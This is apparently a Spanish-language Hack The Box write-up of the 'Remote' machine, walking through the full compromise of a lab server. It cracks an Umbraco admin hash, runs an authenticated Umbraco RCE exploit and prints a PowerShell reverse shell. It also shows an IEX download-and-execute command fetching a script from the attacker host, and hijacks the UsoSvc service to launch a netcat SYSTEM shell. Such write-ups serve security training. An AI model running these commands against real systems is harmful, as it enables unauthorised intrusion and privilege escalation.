-rwx------ <span style="color:#ae81ff">1</span> nobody   <span style="color:#ae81ff">4294967294</span>    <span style="color:#ae81ff">89</span> Nov  <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">2018</span> Global.asax
drwx------ <span style="color:#ae81ff">2</span> nobody   <span style="color:#ae81ff">4294967294</span>  <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">2020</span> Media
drwx------ <span style="color:#ae81ff">2</span> nobody   <span style="color:#ae81ff">4294967294</span>    <span style="color:#ae81ff">64</span> Feb <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">2020</span> scripts
drwx------ <span style="color:#ae81ff">2</span> nobody   <span style="color:#ae81ff">4294967294</span>  <span style="color:#ae81ff">8192</span> Feb <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">2020</span> Umbraco
drwx------ <span style="color:#ae81ff">2</span> nobody   <span style="color:#ae81ff">4294967294</span>  <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">2020</span> Umbraco_Client
drwx------ <span style="color:#ae81ff">2</span> nobody   <span style="color:#ae81ff">4294967294</span>  <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">2020</span> Views
-rwx------ <span style="color:#ae81ff">1</span> nobody   <span style="color:#ae81ff">4294967294</span> <span style="color:#ae81ff">28539</span> Feb <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">2020</span> Web.config
</code></pre></div><p>Tras googlear un poco dónde se quedan guardadas las credenciales de <em>Umbraco</em>, encontramos el archivo <em>Umbraco.sdf</em> en el directorio <em>App_Data</em> . Al inspeccionar este archivo nos muestra que contiene &ldquo;<em>data</em>&rdquo;. Se trata de un archivo que contiene la base de datos.</p>
<p>Al hacerle un simple <code>cat</code> se muestran carácteres extraños. Se podría usar algún programa para tratar de visualizar el contenido, pero antes de estar utilizando programas, intento ir de más simple a más complejo, así que le hago un <code>strings</code> para comprobar qué se puede sacar en claro de este archivo:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ file Umbraco.sdf 
Umbraco.sdf: data

$ strings Umbraco.sdf | head
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;hashAlgorithm&#34;</span>:<span style="color:#e6db74">&#34;SHA1&#34;</span><span style="color:#f92672">}</span>en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;hashAlgorithm&#34;</span>:<span style="color:#e6db74">&#34;SHA1&#34;</span><span style="color:#f92672">}</span>admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;hashAlgorithm&#34;</span>:<span style="color:#e6db74">&#34;SHA1&#34;</span><span style="color:#f92672">}</span>admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw<span style="color:#f92672">==</span>AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts<span style="color:#f92672">={</span><span style="color:#e6db74">&#34;hashAlgorithm&#34;</span>:<span style="color:#e6db74">&#34;HMACSHA256&#34;</span><span style="color:#f92672">}</span>smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw<span style="color:#f92672">==</span>AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts<span style="color:#f92672">={</span><span style="color:#e6db74">&#34;hashAlgorithm&#34;</span>:<span style="color:#e6db74">&#34;HMACSHA256&#34;</span><span style="color:#f92672">}</span>smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg<span style="color:#f92672">==</span>RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA<span style="color:#f92672">={</span><span style="color:#e6db74">&#34;hashAlgorithm&#34;</span>:<span style="color:#e6db74">&#34;HMACSHA256&#34;</span><span style="color:#f92672">}</span>ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
@<span style="color:#f92672">{</span>pv
qpkaj
</code></pre></div><p>Encontramos que aparecen dos usuarios con lo que parecen dos contraseñas hasheadas:</p>
<table>
<thead>
<tr>
<th>Usuario</th>
<th>Hash</th>
<th>Contraseña</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="mailto:admin@htb.local">admin@htb.local</a></td>
<td>b8be16afba8c314ad33d812f22a04991b90e2aaa</td>
<td>baconandcheese</td>
</tr>
<tr>
<td><a href="mailto:smith@htb.local">smith@htb.local</a></td>
<td>ljxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts=</td>
<td>N/A</td>
</tr>
</tbody>
</table>
<h1 id="explotación">Explotación</h1>
<h2 id="umbraco-cms">Umbraco CMS</h2>
<p>Una vez que tenemos un usuario y una contraseña en texto claro, pruebo a acceder a Umbraco y conseguimos loguearnos como administrator. Conseguimos saber qué versión está corriendo.
<img loading="lazy" src="../assets/posts/remote/admin_good.png" srcset="/../assets/posts/remote/admin_good.png, ../assets/posts/remote/admin_good.png 1.5x, /../assets/posts/remote/admin_good.png 2x" sizes="auto" data-title="/../assets/posts/remote/admin_good.png" data-alt="/../assets/posts/remote/admin_good.png" width="1901" height="1041" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
<p>Una vez sabemos la versión, buscamos exploits disponibles de manera local para tratar de conseguir RCE. Nos creamos un mirror del exploit y le pasamos los parámetros que nos pide.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ searchsploit Umbraco 7.12.4
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Umbraco CMS 7.12.4 - <span style="color:#f92672">(</span>Authenticated<span style="color:#f92672">)</span> Remote Code Execution                                                                                                  | aspx/webapps/46153.py
Umbraco CMS 7.12.4 - Remote Code Execution <span style="color:#f92672">(</span>Authenticated<span style="color:#f92672">)</span>                                                                                                  | aspx/webapps/49488.py
------------------------------------------------------------------------------------------------------------------------------------------------------------ -------------------------------

$ python 49488.py -u admin@htb.local -p baconandcheese -i http://remote.htb -c whoami
iis apppool<span style="color:#ae81ff">\d</span>efaultapppool
</code></pre></div><p>Tenemos RCE dentro de la máquina, así que ahora se trata de conseguir una shell en ella. Creamos una reverse shell y abrimos un servidor http con python para poder transferirla a la máquina.</p>
<p>Para crear nuestra reverse shell uso este script en <em>PowerShell</em>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$client = New-Object System.Net.Sockets.TCPClient(<span style="color:#e6db74">&#34;10.10.10.10&#34;</span>,80);$stream = $client.GetStream();<span style="color:#66d9ef">[byte[]]</span>$bytes = 0..65535|%{0};<span style="color:#66d9ef">while</span>(($i = $stream.Read($bytes, 0, $bytes.Length)) <span style="color:#f92672">-ne</span> 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + <span style="color:#e6db74">&#34;PS &#34;</span> + (pwd).Path + <span style="color:#e6db74">&#34;&gt; &#34;</span>;$sendbyte = (<span style="color:#66d9ef">[text.encoding]</span>::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python 49488.py -u admin@htb.local -p baconandcheese -i http://remote.htb -c powershell.exe -a <span style="color:#e6db74">&#34;IEX(New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.12:8000/rev.ps1&#39;)&#34;</span>

$ sudo python3 -m http.server 
Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
10.10.10.180 - - <span style="color:#f92672">[</span>12/Jul/2021 12:23:26<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /rev.ps1 HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
</code></pre></div><p>Una vez transferida la shell a la máquina víctima, abrimos el puerto a la escucha con netcat en nuestra máquina:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo nc -lvnp <span style="color:#ae81ff">443</span>
connect to <span style="color:#f92672">[</span>10.10.14.12<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.180<span style="color:#f92672">]</span> <span style="color:#ae81ff">49709</span>
PS C:<span style="color:#ae81ff">\w</span>indows<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\i</span>netsrv&gt; whoami
iis apppool<span style="color:#ae81ff">\d</span>efaultapppool
</code></pre></div><h2 id="usertxt">user.txt</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\windows\system32\inetsrv&gt; cd C:\
PS C:\&gt; cd Users
PS C:\Users&gt; dir


    Directory<span style="color:#960050;background-color:#1e0010">:</span> C:\Users


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        2/19/2020   3<span style="color:#960050;background-color:#1e0010">:</span>12 PM                .NET v2.0                                                             
d-----        2/19/2020   3<span style="color:#960050;background-color:#1e0010">:</span>12 PM                .NET v2.0 Classic                                                     
d-----        2/19/2020   3<span style="color:#960050;background-color:#1e0010">:</span>12 PM                .NET v4.5                                                             
d-----        2/19/2020   3<span style="color:#960050;background-color:#1e0010">:</span>12 PM                .NET v4.5 Classic                                                     
d-----        7/11/2021   7<span style="color:#960050;background-color:#1e0010">:</span>07 PM                Administrator                                                         
d-----        2/19/2020   3<span style="color:#960050;background-color:#1e0010">:</span>12 PM                Classic .NET AppPool                                                  
d-r---        2/20/2020   2<span style="color:#960050;background-color:#1e0010">:</span>42 AM                Public                                                                

PS C:\Users&gt; cd Public

PS C:\Users\Public&gt; dir
    Directory<span style="color:#960050;background-color:#1e0010">:</span> C:\Users\Public


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-r---        2/19/2020   3<span style="color:#960050;background-color:#1e0010">:</span>03 PM                Documents                                                             
d-r---        9/15/2018   3<span style="color:#960050;background-color:#1e0010">:</span>19 AM                Downloads                                                             
d-r---        9/15/2018   3<span style="color:#960050;background-color:#1e0010">:</span>19 AM                Music                                                                 
d-r---        9/15/2018   3<span style="color:#960050;background-color:#1e0010">:</span>19 AM                Pictures                                                              
d-r---        9/15/2018   3<span style="color:#960050;background-color:#1e0010">:</span>19 AM                Videos                                                                
-ar---        7/11/2021   7<span style="color:#960050;background-color:#1e0010">:</span>07 PM             34 user.txt                                                              


PS C:\Users\Public&gt; type user.txt
b200d........................
</code></pre></div><h1 id="priv-esc">Priv. Esc.</h1>
<h2 id="roottxt">root.txt</h2>
<p>Comenzamos con una enumeración del sistema con winPEAS. Nos lo transferimos a la máquina y lo ejecutamos:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Users\Public&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a <span style="color:#66d9ef">process</span> level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas <span style="color:#66d9ef">for</span> a <span style="color:#66d9ef">process</span>        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a <span style="color:#66d9ef">process</span> working set            Disabled

PS C:\Users\Public&gt; cd C:/Windows/TEMP

PS C:/Windows/TEMP&gt; iwr -Uri http<span style="color:#960050;background-color:#1e0010">:</span>//10.10.14.12<span style="color:#960050;background-color:#1e0010">:</span>8000/winPEASx64.exe -Outfile win.exe

PS C:/Windows/TEMP&gt; ./win.exe
...<span style="color:#66d9ef">[snip]</span>...

  [+] Modifiable Services                                                                                                                                                                   
   [?] Check <span style="color:#66d9ef">if</span> you can modify any service https<span style="color:#960050;background-color:#1e0010">:</span>//book.hacktricks.xyz/windows/windows-local-privilege-escalation<span style="color:#75715e">#services                                                                   </span>
    LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:                                                                                                                                               
    UsoSvc<span style="color:#960050;background-color:#1e0010">:</span> AllAccess, Start  
	
...<span style="color:#66d9ef">[snip]</span>...
</code></pre></div><p>Encontramos el servicio <em>UsoSvc</em>, siguiendo la guía de <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md"target="_blank" rel="external nofollow noopener noreferrer">PayloadsAllTheThins - Windows Privilege Escalation</a>, encontramos que podemos conseguir escalar al usuario Administrator con el <em>CVE-2019-1322</em>. Se trata de una incorrecta administración de permisos en un servicio corriendo bajo <em>NT AUTHORITY/SYSTEM</em>, permitiéndonos reemplazar el binario por netcat y así obtener una reverse shell como Administrador.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Windows\TEMP&gt; iwr -Uri http<span style="color:#960050;background-color:#1e0010">:</span>//10.10.14.12<span style="color:#960050;background-color:#1e0010">:</span>8000/nc64.exe -Outfile nc.exe 

PS C:\Windows\TEMP&gt; sc.exe stop UsoSvc
                                                                                               
SERVICE_NAME<span style="color:#960050;background-color:#1e0010">:</span> UsoSvc                                                                           
        TYPE               <span style="color:#960050;background-color:#1e0010">:</span> 30  WIN32                                                         
        STATE              <span style="color:#960050;background-color:#1e0010">:</span> 3  STOP_PENDING                                                   
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)                
        WIN32_EXIT_CODE    <span style="color:#960050;background-color:#1e0010">:</span> 0  (0x0)                                                          
        SERVICE_EXIT_CODE  <span style="color:#960050;background-color:#1e0010">:</span> 0  (0x0)                                                          
        CHECKPOINT         <span style="color:#960050;background-color:#1e0010">:</span> 0x3                                                               
        WAIT_HINT          <span style="color:#960050;background-color:#1e0010">:</span> 0x7530 

PS C:\Windows\TEMP&gt; sc.exe config UsoSvc binpath=<span style="color:#e6db74">&#34;C:/Windows/TEMP/nc.exe 10.10.14.12 4444 -e cmd.exe&#34;</span> 
<span style="color:#66d9ef">[SC]</span> ChangeServiceConfig SUCCESS

PS C:\Windows\TEMP&gt; sc.exe qc usosvc
SERVICE_NAME<span style="color:#960050;background-color:#1e0010">:</span> usosvc                                                                           
        TYPE               <span style="color:#960050;background-color:#1e0010">:</span> 20  WIN32_SHARE_PROCESS                                           
        START_TYPE         <span style="color:#960050;background-color:#1e0010">:</span> 2   AUTO_START  (DELAYED)                                         
        ERROR_CONTROL      <span style="color:#960050;background-color:#1e0010">:</span> 1   NORMAL                                                        
        BINARY_PATH_NAME   <span style="color:#960050;background-color:#1e0010">:</span> C:/Windows/TEMP/nc.exe 10.10.14.12 4444 -e cmd.exe                  
        LOAD_ORDER_GROUP   <span style="color:#960050;background-color:#1e0010">:</span>                                                                   
        TAG                <span style="color:#960050;background-color:#1e0010">:</span> 0                                                                 
        DISPLAY_NAME       <span style="color:#960050;background-color:#1e0010">:</span> Update Orchestrator Service                                       
        DEPENDENCIES       <span style="color:#960050;background-color:#1e0010">:</span> rpcss                                                             
        SERVICE_START_NAME <span style="color:#960050;background-color:#1e0010">:</span> LocalSystem  
		
PS C:\Windows\TEMP&gt; sc.exe start UsoSvc 
</code></pre></div><p>En nuestra máquina ponemos un puerto a la escucha:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo rlwrap nc -lvnp <span style="color:#ae81ff">4444</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
connect to <span style="color:#f92672">[</span>10.10.14.12<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.180<span style="color:#f92672">]</span> <span style="color:#ae81ff">49870</span>
Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.17763.107<span style="color:#f92672">]</span>
<span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2018</span> Microsoft Corporation. All rights reserved.

whoami
nt authority<span style="color:#ae81ff">\s</span>ystem

PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; type C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\r</span>oot.txt
386bd................
</code></pre></div></div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="Updated on 2021-10-11 12:40:00">Updated on 2021-10-11&nbsp;</span>
      </div><div class="post-info-license">
          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
        </div></div>
    <div class="post-info-line">
      <div class="post-info-md"></div>
      <div class="post-info-share">
        <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="/posts/remote-htb/remote-htb/" data-title="Remote HTB Writeup" data-via="jagelit0" data-hashtags="linux,writeup,easy"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="/posts/remote-htb/remote-htb/" data-hashtag="linux"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="/posts/remote-htb/remote-htb/" data-title="Remote HTB Writeup" data-image="../assets/posts/remote/remote_banner.png"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
  </span>
      </div>
    </div>
  </div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/linux/' class="post-tag">linux</a><a href='/tags/writeup/' class="post-tag">writeup</a><a href='/tags/easy/' class="post-tag">easy</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
    </section>
  </div>

  <div class="post-nav"><a href="/posts/armaggedon-htb/armaggedon-htb/" class="post-nav-item" rel="prev" title="Armaggedon HTB Writeup"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Armaggedon HTB Writeup</a>
      <a href="/posts/monitors-htb/monitors-htb/" class="post-nav-item" rel="next" title="Monitors HTB Writeup">Monitors HTB Writeup<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></main><footer class="footer">
    <div class="footer-container"><div class="footer-line custom">[rottenbytes]</div><div class="footer-line statistics"></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
        </div></div><div id="mask"></div><noscript>
    <div class="noscript-warning">Theme FixIt works best with JavaScript enabled.</div>
  </noscript>
</div><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":10},"comment":{"enable":false},"data":{"typeit-header-desktop":"\u003e rottenbytes","typeit-header-title-mobile":"\u003e rottenbytes"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"typeit-header-desktop":["typeit-header-desktop"],"typeit-header-title-mobile":["typeit-header-title-mobile"]},"duration":-1,"loop":false,"speed":100}};</script><script src="/js/theme.min.js" defer></script></body>
</html>
